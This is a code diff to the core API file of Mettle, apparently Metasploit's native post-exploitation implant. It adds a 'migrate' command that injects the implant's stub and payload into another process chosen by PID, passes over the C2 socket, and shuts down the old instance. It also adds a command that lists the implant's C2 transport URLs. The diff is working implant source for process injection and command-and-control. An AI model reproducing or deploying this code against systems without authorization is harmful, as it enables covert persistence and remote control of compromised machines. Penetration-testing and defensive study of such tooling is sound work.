@@ -3,19 +3,95 @@
  * @brief Core API calls
  * @file tlv_coreapi.c
  */
-
 #include "crypttlv.h"
 #include "log.h"
 #include "tlv.h"
 #include "command_ids.h"
 #include "extensions.h"
 #include "util-common.h"
+#include "bufferev.h"
+#include "network_client.h"
+#include "c2.h"
+#include "base_inject.h"
 
 #include <mettle.h>
 #include <errno.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <fcntl.h>
+
+
+static void migrate_break_cb(struct ev_loop *loop, ev_timer *w, int revents)
+{
+	struct mettle *m = w->data;
+	struct c2 *c2 = mettle_get_c2(m);
+	
+	while(c2_transport_egress_pending(c2)){};
+
+	free(w);
+	ev_break(loop, EVBREAK_ALL);
+}
+
+static struct tlv_packet *core_migrate(struct tlv_handler_ctx *ctx)
+{
+
+	uint32_t pid;
+	uint32_t destination_arch;
+	size_t payload_length, uuid_length, stub_length;
+
+	struct mettle *m = ctx->arg;
+	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
+
+#if defined(__x86_64__) || defined(__i386__)
+	if(migrate_support())
+	{
+		tlv_packet_get_u32(ctx->req, TLV_TYPE_MIGRATE_PID, &pid);
+		tlv_packet_get_u32(ctx->req, TLV_TYPE_MIGRATE_ARCH, &destination_arch);
+
+		char *payload = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_PAYLOAD, &payload_length);
+
+		// payload cannot be NULL
+		if (!payload || payload_length == 0)
+			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
+
+		const char *uuid = tlv_dispatcher_get_uuid(td,&uuid_length);
+
+		char *migrate_stub = tlv_packet_get_raw(ctx->req, TLV_TYPE_MIGRATE_STUB, &stub_length);
+
+		// stub cannot be NULL
+		if (!migrate_stub || stub_length == 0)
+			return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
+
+		struct c2 *c2 = mettle_get_c2(m);
+		struct c2_transport * transport = c2_get_current_transport(c2);
+		int fd = c2_transport_get_socket_fd(transport);
+
+		if(migrate(pid, migrate_stub, stub_length, payload, payload_length, uuid, fd))
+		{
+			struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
+			
+			/*
+			 * The TCP response is sent faster than HTTP response, so we need to make sure that the Mettle is killed after the response is sent.
+			 */
+			ev_timer *break_timer = malloc(sizeof(ev_timer));
+			if (break_timer) {
+				break_timer->data = m;
+				ev_timer_init(break_timer, migrate_break_cb, 0.5, 0);
+				ev_timer_start(mettle_get_loop(m), break_timer);
+			} else {
+				// I guess the mettle dies
+				ev_break(mettle_get_loop(m), EVBREAK_ALL);
+			}
+			return p;
+		}
+	}
+#endif
+
+	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
+
+	return p;
+}
+
 
 static void add_command_id(uint32_t command_id, void *arg)
 {
@@ -219,6 +295,28 @@ done:
 	return p;
 }
 
+static struct tlv_packet *core_transport_list(struct tlv_handler_ctx *ctx)
+{
+	struct mettle *m = ctx->arg;
+	struct c2 *c2 = mettle_get_c2(m);
+	struct c2_transport * transport = c2_get_current_transport(c2);
+	struct c2_transport * current_transport = c2_get_current_transport(c2);
+	
+	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
+	
+	do {
+		struct tlv_packet *packet_group = tlv_packet_new(TLV_TYPE_TRANS_GROUP, 0); 
+		packet_group = tlv_packet_add_str(packet_group, TLV_TYPE_TRANS_URL, c2_transport_uri(current_transport));
+
+		if (packet_group) {
+			p = tlv_packet_add_child(p, packet_group);
+		}
+		current_transport =  c2_get_next_transport(current_transport);
+	} while(current_transport != transport);
+
+	return p;
+}
+
 void tlv_register_coreapi(struct mettle *m)
 {
 	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);
@@ -226,9 +324,11 @@ void tlv_register_coreapi(struct mettle *m)
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_ENUMEXTCMD, core_enumextcmd, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_MACHINE_ID, core_machine_id, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_SET_UUID, core_set_uuid, m);
+	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_MIGRATE, core_migrate, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_GET_SESSION_GUID, core_get_session_guid, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_SET_SESSION_GUID, core_set_session_guid, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION, core_negotiate_tlv_encryption, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_LOADLIB, core_loadlib, m);
 	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_SHUTDOWN, core_shutdown, m);
+	tlv_dispatcher_add_handler(td, COMMAND_ID_CORE_TRANSPORT_LIST, core_transport_list, m);
 }
